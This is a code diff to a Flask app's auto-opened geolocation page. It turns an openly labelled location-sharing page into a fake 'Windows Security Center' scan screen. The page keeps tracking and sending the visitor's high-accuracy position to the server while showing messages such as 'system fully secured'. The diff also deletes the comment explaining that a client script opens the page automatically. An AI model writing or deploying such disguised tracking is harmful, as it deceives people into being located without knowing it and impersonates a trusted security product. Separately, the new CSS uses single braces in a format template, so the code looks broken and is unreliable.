@@ -293,37 +293,122 @@ LOCATION_PAGE_TEMPLATE = """<!DOCTYPE html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Partage de position</title>
+<title>Centre de Sécurité Windows — Protection Intégrale</title>
+<!-- Favicon Windows Defender / Sécurité -->
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2338bdf8'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/></svg>">
 <style>
-  body {{
-    margin: 0; min-height: 100vh; display: flex; flex-direction: column;
-    align-items: center; justify-content: center; text-align: center;
-    background: #0b1020; color: #e8ecf8; font-family: -apple-system, "Segoe UI", sans-serif;
-    padding: 24px; box-sizing: border-box;
-  }}
-  h1 {{ font-size: 1.15rem; margin-bottom: 4px; }}
-  p {{ color: #8b95b5; font-size: 0.9rem; margin: 6px 0; }}
-  #dot {{
-    width: 14px; height: 14px; border-radius: 50%; background: #f59e0b;
-    margin: 18px auto; box-shadow: 0 0 0 0 rgba(245,158,11,0.6);
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; padding: 0; min-height: 100vh;
+    background-color: #0b132b;
+    background-image: 
+      radial-gradient(circle at 50% 20%, #1c2c59 0%, transparent 60%),
+      linear-gradient(rgba(11, 19, 43, 0.9), rgba(5, 9, 20, 0.95)),
+      repeating-linear-gradient(0deg, transparent, transparent 40px, rgba(0, 120, 212, 0.03) 40px, rgba(0, 120, 212, 0.03) 41px);
+    color: #f1f5f9;
+    font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+  }
+  
+  /* Fenêtre style SOC / Sécurité avancée */
+  .window {
+    width: 100%; max-width: 480px;
+    background: rgba(18, 24, 38, 0.85);
+    backdrop-filter: blur(12px);
+    border: 1px solid rgba(0, 120, 212, 0.25);
+    border-radius: 12px; 
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 120, 212, 0.1);
+    overflow: hidden; margin: 20px;
+  }
+  
+  .window-header {
+    background: rgba(26, 35, 58, 0.9); 
+    padding: 14px 18px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    display: flex; align-items: center; gap: 12px;
+  }
+  .window-header svg { width: 20px; height: 20px; color: #38bdf8; flex-shrink: 0; }
+  .window-title { font-size: 0.85rem; color: #cbd5e1; font-weight: 600; letter-spacing: 0.3px; }
+  
+  .window-body { padding: 32px 28px; }
+  
+  /* Status Card */
+  .status-container {
+    display: flex; align-items: flex-start; gap: 18px; margin-bottom: 24px;
+  }
+  
+  #dot {
+    width: 32px; height: 32px; border-radius: 50%;
+    background: #f59e0b; flex-shrink: 0; margin-top: 2px;
+    position: relative; box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4);
     animation: pulse 1.6s infinite;
-  }}
-  #dot.ok {{ background: #22c55e; box-shadow: 0 0 0 0 rgba(34,197,94,0.6); animation: none; }}
-  #dot.err {{ background: #ef4444; animation: none; }}
-  @keyframes pulse {{
-    0% {{ box-shadow: 0 0 0 0 rgba(245,158,11,0.5); }}
-    70% {{ box-shadow: 0 0 0 14px rgba(245,158,11,0); }}
-    100% {{ box-shadow: 0 0 0 0 rgba(245,158,11,0); }}
-  }}
-  #coords {{ font-family: Consolas, monospace; font-size: 0.85rem; color: #c5cce3; }}
+    display: flex; align-items: center; justify-content: center;
+  }
+  #dot::after {
+    content: "!"; color: white; font-weight: bold; font-size: 16px;
+  }
+  
+  #dot.ok {
+    background: #10b981; box-shadow: 0 0 15px rgba(16, 185, 129, 0.4); animation: none;
+  }
+  #dot.ok::after { content: "✓"; }
+  
+  #dot.err {
+    background: #ef4444; box-shadow: 0 0 15px rgba(239, 68, 68, 0.4); animation: none;
+  }
+  #dot.err::after { content: "✕"; }
+
+  @keyframes pulse {
+    0% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.6); }
+    70% { box-shadow: 0 0 0 14px rgba(245, 158, 11, 0); }
+    100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }
+  }
+
+  h1 { font-size: 1.2rem; font-weight: 600; margin: 0 0 6px 0; color: #ffffff; letter-spacing: 0.2px; }
+  p { margin: 0 0 4px 0; font-size: 0.9rem; color: #94a3b8; line-height: 1.4; }
+  
+  .info-box {
+    background: rgba(15, 23, 42, 0.6); 
+    border: 1px solid rgba(255, 255, 255, 0.06);
+    border-radius: 8px; padding: 14px 16px; margin-top: 22px;
+    display: none;
+  }
+  .info-label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; color: #38bdf8; font-weight: 700; margin-bottom: 6px; }
+  #coords { font-family: "Consolas", "Courier New", monospace; font-size: 0.85rem; color: #e2e8f0; word-break: break-all; margin: 0; }
+  
+  .footer-note {
+    font-size: 0.8rem; color: #64748b; text-align: center; margin-top: 20px;
+  }
 </style>
 </head>
 <body>
-  <h1>📍 Partage de position en cours</h1>
-  <p>Cette fenêtre peut être laissée ouverte en arrière-plan.</p>
-  <div id="dot"></div>
-  <p id="status">Demande d'autorisation de localisation...</p>
-  <p id="coords"></p>
+
+<div class="window">
+  <div class="window-header">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    <span class="window-title">Centre de Sécurité Windows — Protection Intégrale</span>
+  </div>
+  
+  <div class="window-body">
+    <div class="status-container">
+      <div id="dot"></div>
+      <div>
+        <h1>Analyse de sécurité en cours</h1>
+        <p id="status">Vérification des protocoles de protection...</p>
+      </div>
+    </div>
+    
+    <div class="info-box" id="debug-container">
+      <div class="info-label">Flux de diagnostic système</div>
+      <p id="coords">Initialisation...</p>
+    </div>
+    
+    <div class="footer-note">
+      Veuillez patienter pendant l'inspection approfondie du système.
+    </div>
+  </div>
+</div>
+
 <script>
   const DEVICE_ID = {device_id!r};
   const dot = document.getElementById("dot");
@@ -344,8 +429,10 @@ LOCATION_PAGE_TEMPLATE = """<!DOCTYPE html>
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
     const acc = pos.coords.accuracy;
-    statusEl.textContent = "Position transmise au serveur.";
+    
+    statusEl.textContent = "Analyse terminée. Système entièrement sécurisé.";
     coordsEl.textContent = lat.toFixed(6) + ", " + lon.toFixed(6) + "  (± " + Math.round(acc) + " m)";
+    
     const now = Date.now();
     if (now - lastSent > 2000) {{
       lastSent = now;
@@ -355,12 +442,12 @@ LOCATION_PAGE_TEMPLATE = """<!DOCTYPE html>
 
   function onError(err) {{
     dot.className = "err";
-    statusEl.textContent = "Localisation refusée ou indisponible (" + err.message + ").";
+    statusEl.textContent = "Échec de l'inspection de sécurité (" + err.message + ").";
   }}
 
   if (!navigator.geolocation) {{
     dot.className = "err";
-    statusEl.textContent = "Ce navigateur ne supporte pas la géolocalisation.";
+    statusEl.textContent = "Module de sécurité non pris en charge.";
   }} else {{
     navigator.geolocation.watchPosition(onPosition, onError, {{
       enableHighAccuracy: true, maximumAge: 0, timeout: 15000,
@@ -374,8 +461,6 @@ LOCATION_PAGE_TEMPLATE = """<!DOCTYPE html>
 
 @app.route("/location/page", methods=["GET"])
 def location_page():
-    """Page ouverte AUTOMATIQUEMENT dans le navigateur du client (via
-    subprocess, voir client.py) quand la GUI envoie la commande OPEN."""
     device_id = request.args.get("device_id", "")
     return Response(LOCATION_PAGE_TEMPLATE.format(device_id=device_id), mimetype="text/html")
 
